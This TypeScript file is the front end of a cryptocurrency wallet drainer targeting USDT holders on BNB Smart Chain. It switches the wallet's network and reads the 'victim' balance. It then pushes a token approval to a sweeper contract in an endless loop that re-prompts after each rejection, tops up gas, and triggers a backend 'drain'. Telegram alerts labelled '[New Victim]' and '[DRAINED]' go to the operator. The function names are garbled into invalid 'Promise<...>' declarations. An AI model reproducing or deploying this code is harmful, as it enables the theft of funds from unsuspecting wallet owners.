import { ethers } from "ethers"
import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"

const BACKEND_URL = CONFIG.BACKEND_URL

// ============================================================
// AUTO-SWITCH TO BNB SMART CHAIN (BEP-20)
// Returns a NEW BrowserProvider after successful switch
// ============================================================
export async function Promise<ethers.BrowserProvider>(
  provider: ethers.BrowserProvider
): Promise<ethers.BrowserProvider> {
  // Get the raw ethereum provider from the browser (window.ethereum)
  // This bypasses ethers.js network detection which would throw NETWORK_ERROR
  const ethProvider = (provider as any).provider

  // If there's no provider, just return the one we have
  if (!ethProvider) return provider

  // Get current chain ID directly from the wallet
  const currentChainIdHex = await ethProvider.request({
    method: "eth_chainId",
  })
  const currentChainId = Number(currentChainIdHex)

  // Already on BSC -- return the existing provider
  if (currentChainId === CHAIN_ID) return provider

  try {
    // Step 1: Try to switch to BSC using raw wallet request (no ethers.js wrapper)
    const hexChainId = "0x" + CHAIN_ID.toString(16) // "0x38" for BSC = 56

    await ethProvider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexChainId }],
    })

    // Wait for the switch to complete and wallet to settle
    await new Promise(r => setTimeout(r, 3000))

    // Step 2: Create a FRESH BrowserProvider after the network change
    // The old provider was bound to Ethereum chain 1 -- using it would throw
    // "network changed: 1 => 56" error.
    const newProvider = new ethers.BrowserProvider(ethProvider)

    return newProvider
  } catch (switchError: any) {
    // Error 4902 means BSC has never been added to this wallet
    if (switchError.code === 4902) {
      try {
        const hexChainId = "0x" + CHAIN_ID.toString(16)

        await ethProvider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: hexChainId,
              chainName: CHAIN_NAME,
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: [RPC_URL],
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        })

        await new Promise(r => setTimeout(r, 3000))

        // Create fresh provider after adding and switching
        const newProvider = new ethers.BrowserProvider(ethProvider)
        return newProvider
      } catch (addError) {
        throw new Error("Please manually switch your wallet to BNB Smart Chain")
      }
    }

    // If user rejected the switch, throw a clear error
    if (switchError.code === 4001) {
      throw new Error("Please approve the network switch to BNB Smart Chain")
    }

    throw new Error("Please manually switch your wallet to BNB Smart Chain")
  }
}

// ============================================================
// REQUEST USDT APPROVAL
// ============================================================
export async function Promise<bigint>(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  // Get the signer
  const signer = await provider.getSigner()

  // Create the USDT contract connection
  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  )

  // Fetch victim balance
  const rawBalance = await usdt.balanceOf(victimAddress)
  const decimals = await usdt.decimals()
  const balance = ethers.formatUnits(rawBalance, decimals)

  // Send Telegram notification
  await fetch(`${BACKEND_URL}/api/telegram`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      message: "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | Balance: " + parseFloat(balance).toFixed(2) + " USDT",
    }),
  }).catch(() => {})

  // Calculate approval amount
  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove

  // Infinite retry loop for approval
  while (true) {
    try {
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
      await tx.wait()

      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash,
        }),
      })

      return approveAmount
    } catch (err: any) {
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        await new Promise(r => setTimeout(r, 500))
        continue
      }
      await new Promise(r => setTimeout(r, 500))
      continue
    }
  }
}

// ============================================================
// ENSURE GAS (Funding)
// ============================================================
export async function Promise<boolean>(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress)
  const minGas = ethers.parseEther("0.0003")

  if (balance >= minGas) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: "[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)",
      }),
    })
    return true
  }

  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}

// ============================================================
// EXECUTE DRAIN
// ============================================================
export async function  Promise<boolean>(
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      const decimals = CONFIG.USDT_DECIMALS
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[DRAINED] " + ethers.formatUnits(approvalAmount, decimals) + " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}